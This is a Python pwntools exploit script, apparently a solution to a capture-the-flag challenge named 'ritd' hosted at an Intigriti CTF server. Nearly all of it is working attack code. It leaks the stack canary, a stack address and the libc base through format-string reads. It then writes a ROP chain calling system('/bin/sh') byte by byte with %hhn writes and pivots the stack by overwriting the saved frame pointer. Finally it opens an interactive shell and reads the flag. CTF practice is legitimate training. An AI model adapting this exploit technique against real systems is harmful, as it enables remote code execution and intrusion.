#!/usr/bin/env python3

# type: ignore
# flake8: noqa

import ctypes

from pwn import *

elf = context.binary = ELF("./ritd_patched", checksec=False)
libc = ELF("./libc6_2.35-0ubuntu3.1_amd64.so", checksec=False)


def start(argv=[], *a, **kw):
    nc = "nc ritd.ctf.intigriti.io 1337"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


env = {}

GET_TIMESTAMP = 1
ECHO = 2
READ_IN_THE_DARK = 3
ADMIN_READ = 4


def get_timestamp():
    payload = f"|a|{GET_TIMESTAMP}|b|".encode()
    io.sendlineafter(b"> ", payload)
    io.recvline()
    return int(io.recvline())


def printf_leak(offset, data=b""):
    payload = b""
    payload += b"|a|"
    payload += f"{GET_TIMESTAMP}%{offset}$llx".encode()
    payload += b"||\x00"
    payload = payload.ljust(0x18, b"\x00")
    payload += data
    io.sendlineafter(b"> ", payload)
    io.recvuntil(b"Function: 1")
    leak = int(io.recvline().strip().split(b"-")[0], 16)
    return leak


def read_in_the_dark():
    payload = f"|{get_timestamp()}|{READ_IN_THE_DARK}|c|".encode()
    io.sendlineafter(b"> ", payload)


def echo():
    payload = f"|{get_timestamp()}|{ECHO}|c|".encode()
    io.sendlineafter(b"> ", payload)


while True:
    io = start()

    # for i in range(1, 128):
    #     leak = printf_leak(i)
    #     log.info(f"{i} {leak:#x}")

    canary_leak_offset = 75
    canary = printf_leak(canary_leak_offset)
    log.info(f"{canary=:#x}")

    stack_leak_offset = 7
    stack_leak = printf_leak(stack_leak_offset)
    saved_rbp = stack_leak - 0x3a0 + 0x8
    pivot_addr = ((stack_leak >> 12) + 1) << 12
    pivot_addr += 0x840
    saved_rip = stack_leak - 0x8
    log.info(f"{saved_rbp=:#x}")
    log.info(f"{saved_rip=:#x}")
    log.info(f"{pivot_addr=:#x}")

    if saved_rbp >> 16 != pivot_addr >> 16:
        log.failure(f"Calculated pivot address is not ideal, trying again")
        io.close()
        continue

    libc_leak_offset = 3
    libc_leak = printf_leak(libc_leak_offset) - 0x17
    libc.address = libc_leak - libc.sym["write"]
    log.info(f"{libc.address=:#x}")
    pop_rdi = libc.address + 0x001bc021
    ret = pop_rdi + 1
    str_bin_sh = next(libc.search(b"/bin/sh\x00"))

    ropchain = flat(
        canary, 0,
        pop_rdi, str_bin_sh,
        libc.sym['system']
    )

    # for i in range(1, 128):
    #     leak = printf_leak(i, data=p64(0xcafebabedeadbeef))
    #     log.info(f"{i} {leak:#x}")

    data_offset = 100

    with log.progress('Building ropchain') as prog:
        try:
            for i in range(len(ropchain)):
                prog.status(f"{i:#x}/{len(ropchain):#x}")
                payload = b""
                payload += b"|a|"
                payload += f"{GET_TIMESTAMP}".encode()
                b = ctypes.c_uint8(ropchain[i] - 1).value
                payload += f"%{b}c%{data_offset}$hhn".encode()
                payload += b"||\x00"
                payload = payload.ljust(0x60, b"\x00")
                payload += p64(pivot_addr + i)
                io.sendlineafter(b"> ", payload)
        except EOFError:
            log.failure(
                f"Seems like we are writing to unmapped memory address, trying again")
            io.close()
            continue

    to_pivot = (pivot_addr + 8) & 0xffff
    to_pivot_1 = to_pivot & 0xff
    to_pivot_2 = (to_pivot >> 8) & 0xff
    payload = b""
    payload += b"|a|"
    payload += f"{GET_TIMESTAMP}".encode()
    if to_pivot_1 > to_pivot_2:
        b1 = ctypes.c_uint8(to_pivot_2 - 1).value
        b2 = to_pivot_1 - to_pivot_2
        payload += f"%{b1}c%{data_offset}$hhn%{b2}c%{data_offset+1}$hhn".encode()
        payload += b"||\x00"
        payload = payload.ljust(0x60, b"\x00")
        payload += p64(saved_rbp + 1)
        payload += p64(saved_rbp)
    else:
        b1 = ctypes.c_uint8(to_pivot_1 - 1).value
        b2 = to_pivot_2 - to_pivot_1
        payload += f"%{b1}c%{data_offset}$hhn%{b2}c%{data_offset+1}$hhn".encode()
        payload += b"||\x00"
        payload = payload.ljust(0x60, b"\x00")
        payload += p64(saved_rbp)
        payload += p64(saved_rbp + 1)

    io.sendlineafter(b"> ", payload)
    io.sendline(b"cat flag*")
    print(io.recvline())
    io.sendline(b"echo")
    io.interactive()
    break
